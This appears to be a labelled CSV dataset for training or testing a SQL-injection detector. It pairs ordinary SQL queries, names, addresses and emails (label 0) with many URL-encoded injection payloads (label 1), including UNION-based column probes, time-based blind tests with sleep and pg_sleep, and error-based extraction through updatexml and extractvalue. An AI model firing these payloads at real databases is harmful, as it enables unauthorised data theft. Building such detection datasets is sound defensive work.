Query,Label
2.21E+15,0
eddier,0
SELECT * FROM apple WHERE Price NOT BETWEEN 10 AND 20,0
-7016%25%22%20%20%20%29%20%20%20%20%29%20%20%20%20union%20all%20select%208847%2C8847%2C8847--,1
SELECT * FROM case FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM number,0
1%20%20%20%29%20%20%20%20%29%20%20%20%20and%203228%20%20%3D%20%207376%23,1
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20as%20maxe%20where%205883%20%20%3D%20%205883%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,1
SELECT * FROM brush FETCH FIRST 50 PERCENT ROWS ONLY,0
rhett,0
select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%20and%20%20%20%28%20%20%22%25%22%20%20%3D%20%20%22,1
insert,1
-4219%27%20or%202724%20in%20%20%20%20%28%20%20%20%20%28%20%20%20char%20%20%28%20%20113%20%20%29%20%20%2Bchar%20%20%28%20%20113%20%20%29%20%20%2Bchar%20%20%28%20%20112%20%20%29%20%20%2Bchar%20%20%28%20%20106%20%20%29%20%20%2Bchar%20%20%28%20%20113%20%20%29%20%20%2B%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%202724%20%20%3D%20%202724%20%20%29%20%20%20then%20char%20%20%28%20%2049%20%20%29%20%20%20else%20char%20%20%28%20%2048%20%20%29%20%20%20end%20%20%20%29%20%20%20%20%29%20%20%20%2Bchar%20%20%28%20%20113%20%20%29%20%20%2Bchar%20%20%28%20%20122%20%20%29%20%20%2Bchar%20%20%28%20%20118%20%20%29%20%20%2Bchar%20%20%28%20%20122%20%20%29%20%20%2Bchar%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29,1
1%20procedure%20analyse%20%20%28%20%20extractvalue%20%20%28%20%205840%2Cconcat%20%20%28%20%200x5c%2C0x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%205840%20%20%3D%20%205840%20%20%29%20%20%20then%201%20else%200%20end%20%20%20%29%20%20%20%20%29%20%20%20%2C0x717a767a71%20%20%20%29%20%20%20%20%29%20%20%20%2C1%20%20%29%20%20--%20dtha,1
"calle santa teresa, 87 5?b",0
"SELECT examine,judge FROM position WHERE book = 'deep' UNION SELECT poetry, skin FROM school",0
1%20%20%29%20%20%20where%202679%20%20%3D%20%202679%20or%204915%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%20%20%29%20%20--,1
or%20%27%27%5E%27,1
1%27%2B%20%20%28%20%20select%20idnb%20where%202338%20%20%3D%20%202338,1
1%22%20where%209173%20%20%3D%20%209173%20rlike%20%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%207689%20%20%3D%20%207689%20%20%29%20%20%20then%201%20else%200x28%20end%20%20%20%29%20%20%20%20%29%20%20%20--,1
SELECT front ( s )  FROM remove LEFT JOIN,0
ostapchuk casal,0
28670,0
"c/ salvatella, 98 11?h",0
1%27%20and%20elt%20%20%28%20%204249%20%20%3D%20%204249%2C7259%20%20%29%20%20%20and%20%27nsbj%27%20like%20%27nsbj,1
SELECT * FROM standard WHERE    NOT nature = 'anyway',0
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20as%20lrnh%20where%208569%20%20%3D%20%208569%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull--,1
maestro vitoria 10,0
1%22%20and%206969%20%20%3D%20%20%20%20%28%20%20select%206969%20from%20pg_sleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%22twmy%22%20%20%3D%20%20%22twmy,1
vargas bentos,0
select%20sleep%20%20%28%20%205%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%22lczw%22%20%20%3D%20%20%22lczw,1
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20or%20%20%20%28%20%20select%20%2A%20from%20%20%20%28%20%20select%20%20%28%20%20sleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20ydpu%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%27ytxg%27%20%20%3D%20%20%27ytxg,1
SELECT * FROM personal WHERE Price NOT BETWEEN 10 AND 20,0
-4148%25%22%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20or%20%20%20%28%20%208459%20%20%3D%20%208459%20%20%29%20%20%2A4906%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%22%25%22%20%20%3D%20%20%22,1
latin,0
"calle hemingway, s/n",0
SELECT * FROM perfectly WHERE canal = 'sum'  AND City = 'belt',0
yuvia,0
SELECT buy,0
SELECT * FROM sitting FETCH FIRST 50 PERCENT ROWS ONLY,0
"garrotxa, 118",0
grimm@madrid2012.nu,0
giertych,0
SELECT * FROM back FETCH FIRST 50 PERCENT ROWS ONLY,0
-5322%22%20union%20all%20select%206494%2C6494%2C6494%2C6494%2C6494%2C6494--,1
%29%20%20%20or%20pg_sleep%20%20%28%20%20__TIME__%20%20%29%20%20--,1
1%22%20%20%29%20%20%20or%20updatexml%20%20%28%20%201808%2Cconcat%20%20%28%20%200x2e%2C0x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%201808%20%20%3D%20%201808%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%20%20%29%20%20%2C8666%20%20%29%20%20%20and%20%20%20%28%20%20%22igop%22%20%20%3D%20%20%22igop,1
%23%20from%20wapiti,1
clarucha,0
SELECT mostly FROM expect UNION ALL SELECT related FROM finish ORDER BY pipe,0
SELECT * FROM amount WHERE    NOT factory = 'school',0
raudres,0
1%20%20%29%20%20%20as%20iuje%20where%201976%20%20%3D%20%201976%20and%206537%20%20%3D%20%20dbms_pipe.receive_message%20%20%28%20%20chr%20%20%28%20%2076%20%20%29%20%20%7C%7Cchr%20%20%28%20%20116%20%20%29%20%20%7C%7Cchr%20%20%28%20%20117%20%20%29%20%20%7C%7Cchr%20%20%28%20%2065%20%20%29%20%20%2C5%20%20%29%20%20--,1
calle federico mompou 144 11-d,0
SELECT sheet ( s ) FROM loss INNER JOIN,0
1%27%2B%20%20%28%20%20select%20wkay%20where%205476%20%20%3D%20%205476%20and%20char%20%20%28%20%20120%20%20%29%20%20%7C%7Cchar%20%20%28%20%20106%20%20%29%20%20%7C%7Cchar%20%20%28%20%20117%20%20%29%20%20%7C%7Cchar%20%20%28%20%2085%20%20%29%20%20%20%20%3D%20%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20right%20%20%28%20%20char%20%20%28%20%209981%20%20%29%20%20%2C0%20%20%29%20%20%2C5000000000%20%20%29%20%20%2Cnull%20%20%20%29%20%20%20%20%29%20%20%20%2B%27,1
1%27%20%20%29%20%20%20as%20wtev%20where%205283%20%20%3D%20%205283,1
su0r6s09,0
SELECT COUNT ( problemID ) FROM pound,0
1%25%27%20and%203707%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%20%20%29%20%20%20and%20%27%25%27%20%20%3D%20%20%27,1
-1684%22%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20union%20all%20select%207473%2C7473%23,1
4.29127E+15,0
babasaki,0
bayuca,0
,1
-2505%27%20or%209323%20%20%3D%20%209323%23,1
1%27%2C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%205777%20%20%3D%20%205777%20%20%29%20%20%20then%201%20else%20cast%20%20%28%20%201%20as%20int%20%20%29%20%20/%20%20%28%20%20select%200%20from%20dual%20%20%29%20%20%20end%20%20%29%20%20%20from%20dual%20%20%29,1
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20as%20bosq%20where%204695%20%20%3D%20%204695,1
"SELECT stock, end+ ', ' + difficult+ ' ' + everybody+ ', ' + exercise AS doing  FROM graph",0
"INSERT INTO locate ( nose, fellow, heard, dance, angle, recall )  VALUES  ( 'period', 'laugh'. collect', 'world', 'including', 'under', 'traffic' )",0
-2912%27%20%20%20%29%20%20%20%20%29%20%20%20%20order%20by%201--,1
1emat98,0
SELECT * FROM Orders WHERE OrderDate BETWEEN '1996-07-01' AND '1996-07-31';,0
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20or%204411%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%27holo%27%20%20%3D%20%20%27holo,1
25330,0
winstanley@waterflyesp.hn,0
select%20%2A%20from%20generate_series%20%20%28%20%207754%2C7754%2Ccase%20when%20%20%20%28%20%207754%20%20%3D%20%201252%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20limit%201--,1
lorletha,0
"SELECT yourselfID AS ID, highest AS break FROM sad",0
busoms redolad,0
"SELECT * FROM stand ORDER BY equipment, from",0
tordera savall,0
SELECT TOP 3 * FROM hall WHERE difficulty = 'outer',0
buchel-alymer@gemas.org.bu,0
SELECT AVG ( Price ) FROM gift,0
SELECT AVG ( hand )  FROM final  SELECT SUM ( slope ),0
1%22%20where%209332%20%20%3D%20%209332%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,1
suchet@ciaplast.tel,0
UPDATE later SET judge = 'level'WHERE history = 'lie',0
SELECT * FROM raw  WHERE glass = sentence,0
SELECT * FROM laugh,0
SELECT * FROM congress 3 SELECT * FROM page,0
18011,0
SELECT * FROM frozen WHERE fog = 'raw'  AND City = 'soap',0
alconchel,0
UPDATE toy SET breath = 'consider'WHERE color = 'handsome',0
1%22%20%20%29%20%20%20as%20uyns%20where%204751%20%20%3D%20%204751%20and%20%20%20%28%20%20select%20%2A%20from%20%20%20%28%20%20select%20%20%28%20%20sleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20fzno%20%20%29%20%20--,1
SELECT * FROM Customers WHERE Country = 'Germany' FETCH FIRST 3 ROWS ONLY;,0
"SELECT back AS himself, sand AS [clay]  FROM shelter",0
1%20%20%20%29%20%20%20%20%29%20%20%20%20as%20xoch%20where%208765%20%20%3D%20%208765%20and%203754%20%20%3D%20%20%20%20%28%20%20select%20upper%20%20%28%20%20xmltype%20%20%28%20%20chr%20%20%28%20%2060%20%20%29%20%20%7C%7Cchr%20%20%28%20%2058%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%203754%20%20%3D%20%203754%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%2062%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20from%20dual%20%20%29%20%20--,1
74132716j,0
1%25%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20or%204411%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%27%25%27%20%20%3D%20%20%27,1
-6359%22%20%20%20%29%20%20%20%20%29%20%20%20%20or%20elt%20%20%28%20%203546%20%20%3D%20%202433%2C2433%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%22qxat%22%20%20%3D%20%20%22qxat,1
SELECT * FROM lake WHERE stuck = 'won',0
select%20%2A%20from%20users%20where%20id%20%20%3D%20%201%20or%20%22%20%20%28%20%20_%22%20or%201%20%20%3D%20%201%20--%201,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 292420 )  ORDER BY meta_id ASC",0
SELECT TOP 3 * FROM at WHERE loud = 'shop' SELECT * FROM actually,0
SELECT * FROM strong WHERE NOT swam = 'from'  AND NOT deal = 'cloth',0
select%20%20%20%28%20%20case%20when%20%20%20%28%20%208978%20%20%3D%20%201426%20%20%29%20%20%20then%201%20else%208978%2A%20%20%28%20%20select%208978%20from%20master..sysdatabases%20%20%29%20%20%20end%20%20%29%20%20--,1
select%20%20%20%28%20%20case%20when%20%20%20%28%20%203336%20%20%3D%20%209781%20%20%29%20%20%20then%203336%20else%201/%20%20%28%20%20select%200%20%20%29%20%20%20end%20%20%29%20%20--,1
-8640%20%20%29%20%20%20or%20elt%20%20%28%20%207657%20%20%3D%20%205020%2C5020%20%20%29%20%20%20and%20%20%20%28%20%202346%20%20%3D%20%202346,1
"SELECT general,ourselves,farther FROM vowel LEFT JOIN Orders ON lift.continuedID =  cattle.trip ORDER BY bent.respect",0
vilma,0
7.85716E+15,0
vir7eino,0
-9884%27%20%20%29%20%20%20or%20elt%20%20%28%20%201942%20%20%3D%20%208409%2C8409%20%20%29%20%20%20and%20%20%20%28%20%20%27tqdq%27%20like%20%27tqdq,1
follosas,0
SELECT * FROM Customers  WHERE    NOT Country = 'Germany';,0
severiano,0
SELECT COUNT ( purpleID ) FROM why,0
colvin@freemachine.no,0
02314635f,0
1%27%7C%7C%20%20%28%20%20select%20%27jslz%27%20where%208405%20%20%3D%20%208405%20rlike%20%20%20%28%20%20select%20%2A%20from%20%20%20%28%20%20select%20%20%28%20%20sleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20sgvo%20%20%20%29%20%20%20%20%29%20%20%20%7C%7C%27,1
SELECT * FROM sitting  WHERE come = cotton,0
invo3unta6i5,0
1%25%22%20%20%20%29%20%20%20%20%29%20%20%20%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,1
"SELECT * FROM tall ORDER BY education, greater",0
1%25%22%20union%20all%20select%20null--,1
UPDATE would SET through = 'wrapped'WHERE family = 'film',0
DELETE FROM growth,0
koprulu,0
SELECT COUNT ( DISTINCT flight )  FROM neighbor,0
SELECT * FROM troops WHERE equal NOT LIKE '[bright]%',0
1%25%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%209660%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%20%20%29%20%20--,1
"isabelita ruiz, 31",0
select%20%2A%20from%20users%20where%20id%20%20%3D%20%20%271%27%20%2B%20%20%20%28%20%20%5C%20%20%29%20%20%20union%20select%201%2C%40%40VERSION%20--%201%27,1
tarasova_dabo@comerciosdeaspe.ly,0
-7779%27%20%20%29%20%20%20where%204976%20%20%3D%20%204976%20or%206872%20%20%3D%20%206872--,1
"SELECT * FROM family ORDER BY south, angle",0
SELECT Count ( * )  AS already,0
1%27%20where%205819%20%20%3D%20%205819%20and%20%20%20%28%20%201275%20%20%3D%20%204759%20%20%29%20%20%2A4759--,1
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20or%20%20%20%28%20%20select%202%2A%20%20%28%20%20if%20%20%20%28%20%20%20%20%28%20%20%20select%20%2A%20from%20%20%20%28%20%20select%20concat%20%20%28%20%200x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%208113%20%20%3D%20%208113%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%2C0x78%20%20%20%29%20%20%20%20%29%20%20%20s%20%20%29%20%20%2C%208446744073709551610%2C%208446744073709551610%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%27nlnk%27%20like%20%27nlnk,1
SELECT difference,0
-7267%20%20%29%20%20%20union%20all%20select%201912%2C1912%2C1912%2C1912%2C1912%2C1912%2C1912%2C1912--,1
FROM  ( SELECT DISTINCT strange FROM area ),0
select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5--%20mkoo,1
SELECT COUNT ( worthID ) FROM mirror,0
1%27%7C%7C%20%20%28%20%20select%20%27lstx%27%20from%20dual%20where%202972%20%20%3D%20%202972%20or%204411%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%20%20%20%29%20%20%20%20%29%20%20%20%7C%7C%27,1
SELECT TOP 3 * FROM only SELECT * FROM breathe 3SELECT * FROM wide,0
-1275%22%20union%20all%20select%207861%2C7861%2C7861%2C7861%2C7861%23,1
SELECT * FROM somewhere 3 SELECT * FROM damage,0
1%27%20%20%20%29%20%20%20%20%29%20%20%20%20and%206969%20%20%3D%20%20%20%20%28%20%20select%206969%20from%20pg_sleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%27prjf%27%20%20%3D%20%20%27prjf,1
-1304%27%20%20%29%20%20%20union%20all%20select%207639%23,1
"calle pea 49, 9?b",0
"SELECT column_name ( s )  FROM suggest,had",0
SELECT far FROM high UNION SELECT old FROM purple ORDER BY similar,0
SELECT * FROM final  WHERE salmon NOT LIKE '[ship]%',0
dorene6,0
arrazua-ubarrundia,0
SELECT COUNT ( respectID ) FROM pressure,0
erill,0
"SELECT Orders.tearsrID, Employees.bus, Employees.skin FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.promisedID ORDER BY Orders.lookID",0
%28%20%20case%20when%202646%20%20%3D%20%208520%20then%202646%20else%20null%20end%20%20%29,1
-7675%25%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20order%20by%201--,1
1%27%7C%7C%20%20%28%20%20select%20%27ttyt%27%20where%203751%20%20%3D%20%203751%20or%207417%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%20%20%29%20%20--,1
1%27%20%20%29%20%20%20and%20make_set%20%20%28%20%208403%20%20%3D%20%208403%2C8899%20%20%29%20%20%20and%20%20%20%28%20%20%27ojag%27%20%20%3D%20%20%27ojag,1
mariabel,0
1%27%20%20%29%20%20%20where%209817%20%20%3D%20%209817,1
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20and%203202%20%20%3D%20%20like%20%20%28%20%20%27abcdefg%27%2Cupper%20%20%28%20%20hex%20%20%28%20%20randomblob%20%20%28%20%20500000000/2%20%20%20%29%20%20%20%20%29%20%20%20%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%22quni%22%20%20%3D%20%20%22quni,1
2793,0
SELECT * FROM clay WHERE shallow IN  ( SELECT enough FROM flag ),0
SELECT third ( s )  FROM about FULL OUTER JOIN,0
SELECT TOP 3 * FROM particular WHERE except = 'ranch' SELECT * FROM double,0
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20and%20char%20%20%28%20%20120%20%20%29%20%20%7C%7Cchar%20%20%28%20%20106%20%20%29%20%20%7C%7Cchar%20%20%28%20%20117%20%20%29%20%20%7C%7Cchar%20%20%28%20%2085%20%20%29%20%20%20%20%3D%20%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20right%20%20%28%20%20char%20%20%28%20%209981%20%20%29%20%20%2C0%20%20%29%20%20%2C5000000000%20%20%29%20%20%2Cnull%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%22hmun%22%20%20%3D%20%20%22hmun,1
1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20or%207552%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%203504%20%20%3D%20%203504,1
1%25%27%20or%20char%20%20%28%20%20117%20%20%29%20%20%7C%7Cchar%20%20%28%20%20111%20%20%29%20%20%7C%7Cchar%20%20%28%20%20105%20%20%29%20%20%7C%7Cchar%20%20%28%20%20100%20%20%29%20%20%20%20%3D%20%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20left%20%20%28%20%20crypt_key%20%20%28%20%20char%20%20%28%20%2065%20%20%29%20%20%7C%7Cchar%20%20%28%20%2069%20%20%29%20%20%7C%7Cchar%20%20%28%20%2083%20%20%29%20%20%2Cnull%20%20%29%20%20%2C0%20%20%29%20%20%2C500000000%20%20%29%20%20%2Cnull%20%20%29%20%20%20and%20%27%25%27%20%20%3D%20%20%27,1
56876281h,0
1%27%20%20%29%20%20%20where%203331%20%20%3D%20%203331%20or%205356%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%20%20%29%20%20--,1
"SELECT Orders.strugglerID, Employees.brief, Employees.favorite FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.leafID ORDER BY Orders.grabbedID",0
SELECT * FROM blue WHERE free = 'officer' LIMIT 3,0
49830,0
1%27%20%20%29%20%20%20and%20%20%20%28%20%20select%20%2A%20from%20%20%20%28%20%20select%20%20%28%20%20sleep%20%20%28%20%205%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20fzno%20%20%29,1
29716,0
select%20like%20%20%28%20%20%27abcdefg%27%2Cupper%20%20%28%20%20hex%20%20%28%20%20randomblob%20%20%28%20%20500000000/2%20%20%20%29%20%20%20%20%29%20%20%20%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%27cwuy%27%20%20%3D%20%20%27cwuy,1
gabriela1,0
1%20%20%29%20%20%20where%205944%20%20%3D%20%205944%20and%20%20%20%28%20%204446%20%20%3D%20%208843%20%20%29%20%20%2A8843--,1
-6611%25%22%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20union%20all%20select%208918%2C8918%23,1
1%27%20and%206055%20%20%3D%20%20ctxsys.drithsx.sn%20%20%28%20%206055%2C%20%20%28%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%206055%20%20%3D%20%206055%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%20%27moyb%27%20%20%3D%20%20%27moyb,1
SELECT * FROM army WHERE animal = 'cutting'  OR cover = 'effort',0
select%20%2A%20from%20users%20where%20id%20%20%3D%20%20%271%27%20or%20%5C.%3C%20%20%20%3D%20%201%20union%20select%201%2C%40%40VERSION%20--%201%27,1
select%20%2A%20from%20users%20where%20id%20%20%3D%20%201%20or%20%22%251%22%20or%201%20%20%3D%20%201%20--%201,1
1%25%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%205451%20%20%3D%20%205451%20%20%29%20%20%20then%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20right%20%20%28%20%20char%20%20%28%20%205451%20%20%29%20%20%2C0%20%20%29%20%20%2C500000000%20%20%29%20%20%2Cnull%20%20%29%20%20%20else%20char%20%20%28%20%20108%20%20%29%20%20%7C%7Cchar%20%20%28%20%2076%20%20%29%20%20%7C%7Cchar%20%20%28%20%20112%20%20%29%20%20%7C%7Cchar%20%20%28%20%20116%20%20%29%20%20%20end%20%20%29%20%20%20from%20information_schema.system_users%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%27%25%27%20%20%3D%20%20%27,1
end%20if,1
mota del cuervo,0
SELECT COUNT ( funny )  FROM understanding,0
-5597%27%20%20%29%20%20%20or%20make_set%20%20%28%20%202490%20%20%3D%20%202164%2C2164%20%20%29,1
-4384%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20or%206872%20%20%3D%20%206872%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%27ukhl%27%20%20%3D%20%20%27ukhl,1
"SELECT tableID AS ID, upper AS yesterday FROM future",0
1%27%20or%20char%20%20%28%20%2068%20%20%29%20%20%7C%7Cchar%20%20%28%20%2069%20%20%29%20%20%7C%7Cchar%20%20%28%20%2097%20%20%29%20%20%7C%7Cchar%20%20%28%20%2085%20%20%29%20%20%20%20%3D%20%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20right%20%20%28%20%20char%20%20%28%20%205389%20%20%29%20%20%2C0%20%20%29%20%20%2C5000000000%20%20%29%20%20%2Cnull%20%20%29%20%20%20and%20%27yaje%27%20%20%3D%20%20%27yaje,1
SELECT DISTINCT progress FROM animal,0
tregenza,0
33529,0
SELECT * FROM act WHERE believed = 'judge'  OR come = 'rose',0
